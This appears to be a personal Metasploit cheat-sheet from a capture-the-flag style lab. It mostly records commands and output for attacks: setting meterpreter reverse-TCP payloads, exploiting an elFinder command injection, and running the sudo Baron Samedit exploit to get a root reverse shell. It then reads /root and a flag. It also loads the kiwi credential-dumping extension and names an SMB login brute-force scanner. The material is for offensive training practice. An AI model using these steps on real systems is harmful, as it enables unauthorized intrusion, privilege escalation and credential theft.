```embed
title: "Msfconsole Commands - Metasploit Unleashed"
image: "https://www.offsec.com/app/uploads/2019/11/offsec-metasploit-unleashed.png"
description: "The MSFconsole has many different command options to chose from. The following are a core set of Metasploit commands with reference to their output."
url: "https://www.offsec.com/metasploit-unleashed/msfconsole-commands/#kill"
```
#### Useful Actions
```
back 
options
show payloads

set payload windows/meterpreter/reverse_tcp
set payload linux/meterpreter/reverse_tcp
set payload windows/x64/meterpreter/reverse_tcp
```

Upload Exploit-DB modules or public modules
```bash
/usr/share/metasploit-framework/modules/exploits
```
We can copy the code into a file and save it in `/usr/share/metasploit-framework/modules/exploits/linux/http`


### Use Sessions
#Helpful #Elevate #Essentials 
Example:
- User Exploit
```
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set SRVPORT 8081
SRVPORT => 8081
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set RHOST 10.129.225.234
RHOST => 10.129.225.234
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set LHOST tun0
LHOST => 10.10.16.13
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > run
```
- Root Elevate/Exploit
```
[*] Backgrounding session 3...
msf6 exploit(linux/local/sudo_baron_samedit) > options

Module options (exploit/linux/local/sudo_baron_samedit):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   SESSION                       yes       The session to run this module on
   WritableDir  /tmp             yes       A directory where you can write files.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.183    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(linux/local/sudo_baron_samedit) > set SESSION 3
SESSION => 3
msf6 exploit(linux/local/sudo_baron_samedit) > set LHOST tun0
LHOST => 10.10.16.13
msf6 exploit(linux/local/sudo_baron_samedit) > run
[*] Started reverse TCP handler on 10.10.16.13:4444 
[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: x86
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
[*] Using automatically selected target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)
[*] Writing '/tmp/CZaF6welJR.py' (763 bytes) ...
[*] Writing '/tmp/libnss_etG/YuH .so.2' (540 bytes) ...
[*] Sending stage (3045380 bytes) to 10.129.225.234
[+] Deleted /tmp/CZaF6welJR.py
[+] Deleted /tmp/libnss_etG/YuH .so.2
[+] Deleted /tmp/libnss_etG
[*] Meterpreter session 4 opened (10.10.16.13:4444 -> 10.129.225.234:56428) at 2025-05-18 11:00:50 +0200

meterpreter > pwd
/tmp
meterpreter > cd /root
meterpreter > ls
Listing: /root
==============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100600/rw-------  178    fil   2022-05-16 17:35:30 +0200  .bash_history
100644/rw-r--r--  3106   fil   2022-05-16 17:34:51 +0200  .bashrc
040700/rwx------  4096   dir   2022-05-16 15:46:07 +0200  .cache
040700/rwx------  4096   dir   2022-05-16 15:46:06 +0200  .config
040755/rwxr-xr-x  4096   dir   2022-05-16 15:46:07 +0200  .local
100644/rw-r--r--  161    fil   2019-12-05 15:39:21 +0100  .profile
100644/rw-r--r--  75     fil   2022-05-16 10:45:33 +0200  .selected_editor
040700/rwx------  4096   dir   2021-10-06 19:37:09 +0200  .ssh
100600/rw-------  13300  fil   2022-05-16 17:34:51 +0200  .viminfo
100644/rw-r--r--  291    fil   2022-05-16 15:51:29 +0200  .wget-hsts
100644/rw-r--r--  24     fil   2022-05-16 17:18:40 +0200  flag.txt
040755/rwxr-xr-x  4096   dir   2021-10-06 19:37:19 +0200  snap

meterpreter > cat flag.txt
```

#### PrivEsc /MIMI finder
#Essentials #Helpful 
```shell
meterpreter > bg

Background session 1? [y/N]  y


msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1

SESSION => 1


msf6 post(multi/recon/local_exploit_suggester) > run

meterpreter > load kiwi

```

#### SMB Cracking
```shell
msf6 > use auxiliary/scanner/smb/smb_login
```
